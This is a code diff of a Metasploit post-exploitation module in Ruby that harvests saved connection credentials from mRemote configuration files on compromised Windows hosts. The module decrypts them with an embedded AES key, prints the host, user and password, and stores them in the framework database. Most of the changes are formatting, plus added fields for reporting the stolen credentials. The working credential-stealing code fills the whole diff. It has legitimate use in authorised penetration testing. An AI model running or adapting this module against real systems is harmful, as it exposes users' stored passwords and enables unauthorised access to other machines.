@@ -33,28 +33,25 @@ class Metasploit3 < Msf::Post
 				'License'       => MSF_LICENSE,
 				'Author'        =>
 					[
-							'TheLightCosine <thelightcosine@gmail.com>',
-							'hdm', #Helped write the Decryption Routine
-							'Rob Fuller <mubix@hak5.org>' #Helped write the Decryption Routine
+						'TheLightCosine <thelightcosine[at]gmail.com>',
+						'hdm', #Helped write the Decryption Routine
+						'Rob Fuller <mubix[at]hak5.org>' #Helped write the Decryption Routine
 					],
-				'Version'       => '$Revision$',
-				'Platform'      => [ 'windows' ],
-				'SessionTypes'  => [ 'meterpreter' ]
-			))
+			'Version'       => '$Revision$',
+			'Platform'      => [ 'windows' ],
+			'SessionTypes'  => [ 'meterpreter' ]
+		))
 
 	end
 
 	def run
 		@secret=  "\xc8\xa3\x9d\xe2\xa5\x47\x66\xa0\xda\x87\x5f\x79\xaa\xf1\xaa\x8c"
-		
+
 		grab_user_profiles().each do |user|
 			next if user['LocalAppData'] == nil
 			tmpath= user['LocalAppData'] + '\\Felix_Deimel\\mRemote\\confCons.xml'
 			get_xml(tmpath)
 		end
-	
-		
-
 	end
 
 	def get_xml(path)
@@ -91,18 +88,16 @@ class Metasploit3 < Msf::Post
 			print_good("HOST: #{host} PORT: #{port} PROTOCOL: #{proto} Domain: #{domain} USER: #{user} PASS: #{pass}")
 			user= "#{domain}\\#{user}" unless domain.nil? or domain.empty?
 			report_auth_info(
-							:host  => host,
-							:port => port,
-							:sname => proto,
-							:user => user,
-							:pass => pass
-						)
-
+				:host  => host,
+				:port => port,
+				:sname => proto,
+				:source_id => session.db_record.id,
+				:source_type => "exploit",
+				:user => user,
+				:pass => pass)
 		end
-
 	end
 
-	
 	def decrypt(encrypted_data, key, iv, cipher_type)
 		aes = OpenSSL::Cipher::Cipher.new(cipher_type)
 		aes.decrypt
@@ -110,6 +105,5 @@ class Metasploit3 < Msf::Post
 		aes.iv = iv if iv != nil
 		aes.update(encrypted_data) + aes.final
 	end
-
 
 end
